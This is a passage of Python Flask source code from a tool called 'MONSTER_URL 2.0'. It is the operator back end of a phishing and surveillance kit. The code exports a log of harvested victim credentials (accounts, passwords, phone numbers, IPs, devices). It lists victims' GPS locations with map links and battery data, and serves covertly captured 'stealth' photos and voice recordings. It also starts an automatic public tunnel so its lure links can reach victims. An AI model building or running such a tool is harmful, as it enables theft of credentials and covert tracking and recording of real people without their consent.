            " 👾 MONSTER_URL 2.0 — HARVESTED TARGET CREDENTIALS LOG",
            f" Generated: {now_iso()}",
            "="*65,
            ""
        ]
        for r in rows:
            lines.append(f"[*] ID: {r['id']} | Site: {r['site']} | Link: {r['link_name']}")
            lines.append(f"    Account  : {r['account'] or r['username'] or 'N/A'}")
            lines.append(f"    Password : {r['password'] or r['phone'] or 'N/A'}")
            if r['extra_data']:
                lines.append(f"    Extra    : {r['extra_data']}")
            lines.append(f"    IP/Device: {r['ip']} ({r['device']})")
            lines.append(f"    Time     : {r['created_at']}")
            lines.append("-" * 60)
            
        return Response(
            "\n".join(lines),
            mimetype="text/plain; charset=utf-8",
            headers={"Content-Disposition": "attachment; filename=monster_url_credentials.txt"}
        )


@app.route("/api/reports")
@admin_required
def api_reports():
    rows = get_db().execute(
        "SELECT r.*, l.name AS link_name FROM reports r "
        "JOIN links l ON l.id = r.link_id ORDER BY r.id DESC LIMIT 500"
    ).fetchall()
    out = []
    for r in rows:
        d = dict(r)
        d["device_summary"] = parse_user_agent(r["ua"])
        if d.get("lat") is not None and d.get("lon") is not None:
            d["maps_url"] = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
        else:
            d["maps_url"] = None
        out.append(d)
    return jsonify(out)


@app.route("/api/reports/<int:report_id>", methods=["DELETE"])
@admin_required
def api_report_delete(report_id):
    db = get_db()
    db.execute("DELETE FROM reports WHERE id=?", (report_id,))
    db.commit()
    return jsonify({"ok": True})


@app.route("/api/reports/clear", methods=["DELETE"])
@admin_required
def api_reports_clear():
    db = get_db()
    db.execute("DELETE FROM reports")
    db.commit()
    return jsonify({"ok": True})


@app.route("/api/stats/<int:link_id>")
@admin_required
def api_stats(link_id):
    rows = get_db().execute(
        "SELECT created_at, accuracy, battery_level, battery_charging, lat, lon "
        "FROM reports WHERE link_id=? ORDER BY id ASC",
        (link_id,),
    ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/media")
@admin_required
def api_media_list():
    rows = get_db().execute(
        "SELECT m.*, l.name AS link_name FROM media m "
        "JOIN links l ON l.id = m.link_id ORDER BY m.id DESC LIMIT 500"
    ).fetchall()
    out = []
    for r in rows:
        d = dict(r)
        d["url"] = url_for("media_file", mid=r["id"])
        out.append(d)
    return jsonify(out)


@app.route("/api/media/<int:mid>/file")
@admin_required
def media_file(mid):
    row = get_db().execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
    if not row:
        abort(404)
    path = MEDIA_DIR / row["filename"]
    if not path.exists():
        abort(404)
    ext = path.suffix.lower()
    if row["kind"] == "photo":
        mime = "image/jpeg" if ext in [".jpg", ".jpeg"] else f"image/{ext.lstrip('.')}"
    else:
        if ext in [".mp4", ".m4a", ".aac"]:
            mime = "audio/mp4"
        elif ext == ".ogg":
            mime = "audio/ogg"
        elif ext == ".wav":
            mime = "audio/wav"
        else:
            mime = "audio/webm"
    return send_file(path, mimetype=mime, as_attachment=False)


@app.route("/api/media/<int:mid>/download")
@admin_required
def media_download(mid):
    row = get_db().execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
    if not row:
        abort(404)
    path = MEDIA_DIR / row["filename"]
    if not path.exists():
        abort(404)
    return send_file(path, as_attachment=True, download_name=row["filename"])


@app.route("/api/media/<int:mid>", methods=["DELETE"])
@admin_required
def media_delete(mid):
    db = get_db()
    row = db.execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
    if row:
        path = MEDIA_DIR / row["filename"]
        if path.exists():
            try:
                path.unlink()
            except Exception:
                pass
        db.execute("DELETE FROM media WHERE id=?", (mid,))
        db.commit()
    return jsonify({"ok": True})


@app.route("/api/media/clear", methods=["DELETE", "POST"])
@admin_required
def api_media_clear():
    """Clears all stealth photos and voice recordings from disk and database."""
    db = get_db()
    # 1. Delete all media files from media/ folder
    if MEDIA_DIR.exists():
        for item in MEDIA_DIR.iterdir():
            if item.is_file():
                try:
                    item.unlink()
                except Exception:
                    pass
    # 2. Clear media table
    db.execute("DELETE FROM media")
    db.commit()
    print("\n" + "="*65)
    print(" 🗑️ [MONSTER_URL] ALL CAPTURED MEDIA FILES & RECORDS CLEARED!")
    print("="*65 + "\n")
    return jsonify({"ok": True, "message": "All captured media cleared successfully!"})


@app.route("/api/database/reset", methods=["POST"])
@app.route("/api/settings/reset-database", methods=["POST"])
@admin_required
def api_database_reset():
    db = get_db()
    # 1. Delete all media files from disk
    if MEDIA_DIR.exists():
        for item in MEDIA_DIR.iterdir():
            if item.is_file():
                try:
                    item.unlink()
                except Exception:
                    pass
    # 2. Wipe tables & reset visit counters safely
    db.execute("DELETE FROM submissions")
    db.execute("DELETE FROM reports")
    db.execute("DELETE FROM media")
    try:
        db.execute("UPDATE links SET visits=0")
    except Exception:
        pass
    db.commit()
    print("\n" + "="*65)
    print(" 🧹 [MONSTER_URL] DATABASE RESET: ALL HARVESTED DATA & MEDIA CLEARED!")
    print("="*65 + "\n")
    return jsonify({"ok": True, "message": "Database and harvested data reset successfully!"})


# ---------------- Server Launcher ----------------
def print_banner(port):
    banner = f"""
====================================================================
 👾 MONSTER_URL 2.0 — Advanced Multi-Platform URL & Target Console
 👤 Developer : Mohammad Fahad
 🐙 GitHub    : https://github.com/Dr-MrBot
 📸 Instagram : https://www.instagram.com/dr_mr.bot/
====================================================================
  [+] Admin Dashboard : http://127.0.0.1:{port}/
  [+] Default User    : {ADMIN_USER}
  [+] Default Pass    : {ADMIN_PASS}
--------------------------------------------------------------------
  [*] Automatic Tunneling Initializing...
  [*] Check the Dashboard top bar for the Live Public HTTPS URL!
====================================================================
"""
    print(banner)


def start_server():
    port = int(os.environ.get("PORT", 5000))
    print_banner(port)
    
    # Launch Automatic Tunnel Manager
    tunnel = TunnelManager(port=port)
    tunnel.start()

    if os.environ.get("USE_HTTPS"):
        app.run(host="0.0.0.0", port=port, ssl_context="adhoc", debug=False)
    else:
        app.run(host="0.0.0.0", port=port, debug=False)


if __name__ == "__main__":
    start_server()
